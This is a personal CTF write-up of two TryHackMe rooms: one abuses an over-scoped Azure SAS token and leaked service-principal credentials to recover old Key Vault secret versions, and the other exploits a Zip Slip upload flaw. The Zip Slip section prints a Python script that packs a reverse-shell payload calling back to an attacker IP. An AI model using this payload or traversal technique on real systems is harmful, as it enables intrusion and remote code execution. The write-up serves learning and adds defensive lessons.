---
title: "TryHackMe — Welcome to The Byte Lotus (Hacker Holidays), Part 2"
date: 2026-08-07 09:00:00 +0200
categories:
  - Writeups
  - TryHackMe
tags:
  - hacker-holidays
  - byte-lotus
  - azure
  - cloud-security
  - sas-token
  - key-vault
  - service-principal
  - zip-slip
  - path-traversal
  - file-upload
  - reverse-shell
  - ctf
published: true
image:
  path: /assets/img/posts/hackerholidays-2/cover.png
  alt: "Welcome to The Byte Lotus — Hacker Holidays, Part 2"
---

**Work in progress, continued.** This is the second part of my [Hacker Holidays writeup](/posts/hackerholidays/). The first post covers the warm-up room plus the first eight released rooms; this one picks up from room 9 onward as they unlock. Same rules as part one: rooms I solved myself are written that way, rooms where I leaned on Claude say so plainly, and flags stay redacted. 

| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Event | Hacker Holidays — "Welcome to The Byte Lotus" |
| Rooms covered so far | Room 9, Room 10 |

## Room 9 — Crypto Cabana

I had never touched cloud before this room, not Azure, not AWS, nothing. One thing that made it less intimidating than I expected: the Azure CLI feels structurally like a Linux terminal, commands, subcommands, flags, the shape of it was familiar even though every single command itself was new to me. I'll say upfront where the line sits: I found the leaked token myself and worked out that it was over-scoped myself. Everything past "here's the token, now what," every actual Azure CLI command that does something with it, I had Claude write. I know there's a whole CLI syntax for this, I just don't know it myself yet.

The room drops you straight into a browser-based Azure Cloud Shell with `az` already available. The target is a "back up your seed phrase" site, and its page source leaks a storage account name, a container name, and a SAS token, all sitting in plain JavaScript.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_06.png" width="700" alt="The CryptoCabana seed-phrase backup site">
<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_07.png" width="700" alt="The page's source code, leaking the storage account name, container name, and a full SAS token in plain JavaScript">

A SAS token is Azure's way of handing out scoped, temporary access to storage without a full login, and this one is genuinely just meant to let the page write one backup file. I decoded its URL-encoded parameters through CyberChef to read them cleanly, and they told a different story than "write one file": `ss=b` for blob service, `srt=sco` for service, container, and object level all at once, `sp=rl` for read and list, and an expiry set to the year 2099. The app only ever needs to write. This token can read and list the entire storage account, forever.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_08.png" width="700" alt="CyberChef decoding the SAS token's URL-encoded parameters">

Turning that observation into actual access is where I needed Claude the whole way, I had never run an `az storage` command before. Listing containers with the token turned up three: `$web`, `backups`, the one the app is meant to use, and `vault`, which had no reason to be reachable with this token at all. Listing and downloading the contents of `vault` came back with two files.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_09.png" width="700" alt="Listing storage containers with the leaked token, finding an unexpected vault container, then listing and downloading its contents">

One was a decoy seed phrase. The other was `backup-service-account.json`, and it was the actual jackpot: a full set of Azure service principal credentials, client ID, client secret, tenant ID, and the URI of a Key Vault, sitting in plain text, with a note on the file that read almost like a joke in hindsight: rotate this if it ever leaves the vault.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_10.png" width="700" alt="The decoy seed phrase alongside backup-service-account.json, containing plaintext service principal credentials">

A service principal is Azure's version of a machine account, an identity meant for an application rather than a person, and these credentials let you authenticate as that identity from anywhere. Again, I didn't know the login syntax, Claude wrote the command, and it logged in cleanly as that service principal.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_11.png" width="700" alt="Logging in as the leaked service principal via the Azure CLI">

From there, the Key Vault the credentials pointed at listed four secrets: three key shards and a master key. The three shards came back to me quickly.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_12.png" width="700" alt="Listing the Key Vault's secrets: three key shards and a master key">

The master key, though, came back Forbidden. This account genuinely wasn't allowed to read it, real least-privilege access control doing exactly what it's supposed to do, which meant the master key was never the intended path.

This is the part I actually want to flag as my own realization, not something Claude pointed me toward: I noticed one of the three shards I did have access to had already been rotated, and rotating a secret in Key Vault doesn't delete the old value, it just adds a new version on top while the previous one stays in the vault's version history. That's the cloud cutting both ways in the same feature: version history is genuinely useful for recovering from a mistake, and it's just as useful for recovering a secret someone thought they'd already invalidated. Checking that shard's version history turned up two versions, created seconds apart, and reading the earlier one directly by its versioned ID gave back its actual value.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_13.png" width="700" alt="Listing version history for one key shard, showing an old and a new version">
<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_14.png" width="700" alt="Reading the value of the old, supposedly-rotated version directly by its full versioned ID">

Three shards, stitched together, made the flag.

Flag: `[redacted]`

## Room 10 — The Hollow Shell

Three of the four stages in this room I did myself: finding the login credentials, testing the upload, and going from shell to flag. The one new piece was Zip Slip itself, a vulnerability class I'd never heard of before this room. I had Claude explain the underlying principle to me and build the actual exploit ZIP. I want to be honest about what that means and what it doesn't: having Claude build it once doesn't mean I could build it myself yet. I've seen it done and I understand the concept now. That's a real step, it's just not the same thing as being able to reproduce it cold.

An nmap scan turned up SSH and a web app on port 5000, a "Byte Lotus Shoreline Display" staff sign-in page.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_01.png" width="700" alt="The Byte Lotus Shoreline Display staff sign-in page">

The credentials for it were sitting in plain view in the page's HTML source, left in an onboarding comment for new staff, no guessing needed once I thought to check.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_02.png" width="700" alt="The page's HTML source, with a staff onboarding comment containing the default login credentials in plain text">

Past login, the app lets you upload a ZIP archive, called a "shell" in the app's own beach theming, which needs a `shell.json` manifest file inside it to be accepted. The page even mentions the app supports optional "automation hooks" that a worker process applies shortly after upload, which turns out to be the exact mechanism the exploit rides on.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_03.png" width="700" alt="The shell upload page, describing the shell.json manifest requirement and mentioning optional automation hooks applied by a background worker">

I tested that upload path with a harmless ZIP first, just a manifest and no real payload, to see how the server handled it before trying anything else. The response told me exactly where it landed: `Stored at shells/62975c0902b6/`.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_04.png" width="700" alt="Confirmation that the test shell was stored at a specific path on the server, shells/62975c0902b6/">

That confirmed the server actually extracts the archive somewhere on disk, and gave me a real path to reason about, rather than guessing blind.

The room's own name was the actual hint I'd been sitting on without registering it: Zip Slip, "slip" being the tell. I didn't know the term, so I asked Claude to walk me through what it actually was before touching anything.

<details style="border: 1px solid rgba(128,128,128,0.35); border-radius: 6px; padding: 0.75em 1em; margin: 1em 0;">
<summary style="cursor: pointer; font-weight: 600;">What Zip Slip actually is, in plain terms</summary>
<div markdown="1" style="margin-top: 0.75em; padding-top: 0.75em; border-top: 1px solid rgba(128,128,128,0.25);">

A ZIP file is really just a list of entries, and each entry has a name, which is also the path it gets written to when someone extracts the archive. Nothing stops that name from being something like `../../../etc/whatever` instead of a normal filename. If the code doing the extracting doesn't check that the final write location is still inside the folder it's supposed to be, an entry like that walks itself out of the upload folder entirely and lands wherever its `../` sequence points, anywhere on disk the process has permission to write. It's not a bug in ZIP itself, it's a missing check in whatever code unpacks it. It's also not obscure or new, this exact class of bug hit several major libraries across multiple languages back in 2018 when it was first named and publicized.

</div>
</details>

The server's ZIP extractor here doesn't check where an entry inside the archive is actually trying to write. A file inside the ZIP named something like `../../../hooks/callback.py` walks itself right out of the intended upload folder on extraction. `hooks/` turned out to be a sibling directory next to `shells/`, sitting in the app's own working directory alongside `app.py` and a `theme_worker.py` process, the automation-hooks worker the upload page mentioned, and the app treats anything dropped into it as a plugin, automatically loading and running any Python file placed there whenever the worker next runs. Write access to that one folder is remote code execution.

Actually building the malicious ZIP is where the real technical trick lived, and where Claude actually did the building. A normal `zip` command or file-manager GUI silently strips `../` sequences back down to something safe when it writes the archive, so the traversal never survives packaging in the first place. The fix is building the archive by hand in Python instead, writing the manifest and the malicious entry directly into the zip file's internal structure:

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}
payload = '''import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<attacker-ip>",4444))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("evil.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../../hooks/callback.py", payload)
```

The one check that actually matters before uploading anything: running `unzip -l evil.zip` and confirming the listing still shows the literal `../../../hooks/callback.py` path. If it's been quietly flattened down to `hooks/callback.py`, the traversal already died during packaging and the upload won't do anything.

The exact number of `../` needed wasn't something I could work out from the URL alone. The web path showed `shells/<hash>/`, but the real folder structure on disk sits deeper than that path suggests, and `hooks/` shares a parent further up than the URL implies. Getting the depth right meant trying `../`, then `../../`, then `../../../` until the listing confirmed a hit, not calculating it from what the browser showed.

With a listener running, the verified ZIP uploaded, and the server processing it, the plugin loader picked up the dropped file and the reverse shell fired on its own, landing directly as the `roomservice` user, no separate privilege escalation needed. From there, getting to the flag was quick: a short detour through the app's own working directory, then straight to `/home/roomservice`.

<img src="/assets/img/posts/hackerholidays-2/hackerholidays-2_05.png" width="700" alt="The reverse shell landing as roomservice, navigating to the home directory, and reading flag.txt">

Flag: `[redacted]`

**What I'm keeping from this one, blue-team side:** an uploaded ZIP whose entries contain `../` is a traversal attempt on the extractor, not a formatting quirk. A new or changed file showing up in a directory the app treats as auto-loading code, plugins, hooks, whatever it's called, right after a file upload, is exactly the moment a file-integrity check should fire. And the actual fix on the defending side isn't complicated once you've seen the attack: every extracted path needs to be checked against the target directory before it's written, and nothing gets extracted anywhere near a directory the app will later execute code from.

## Lessons Learned

**Room 9:** first time touching cloud at all, so the honest split matters here: I found the leaked token and worked out it was over-privileged on my own, but every actual Azure command, listing storage, downloading blobs, logging in as a service principal, querying the Key Vault, was new syntax I had Claude write, not something I could have typed myself. What's mine to keep is the pattern I actually recognized without help: rotating a secret is not the same as deleting it, and if the old version is still sitting in a vault's history, "we rotated it" doesn't mean the leak stopped mattering.

**Room 10:** three of four stages here were mine, and the one that wasn't, crafting a Zip Slip payload from scratch, is now something I've watched happen and understood, not something I can do on my own yet. I'm keeping that distinction on purpose. Seeing a technique built once and being able to rebuild it are two different levels of knowing something, and blurring them together would make this writeup dishonest about where I actually am.

## To Be Continued

Room 9 still needs to happen, and more rooms are unlocking after it. I'll keep adding to this post as they land. See [Part 1](/posts/hackerholidays/) for the warm-up through room 8.
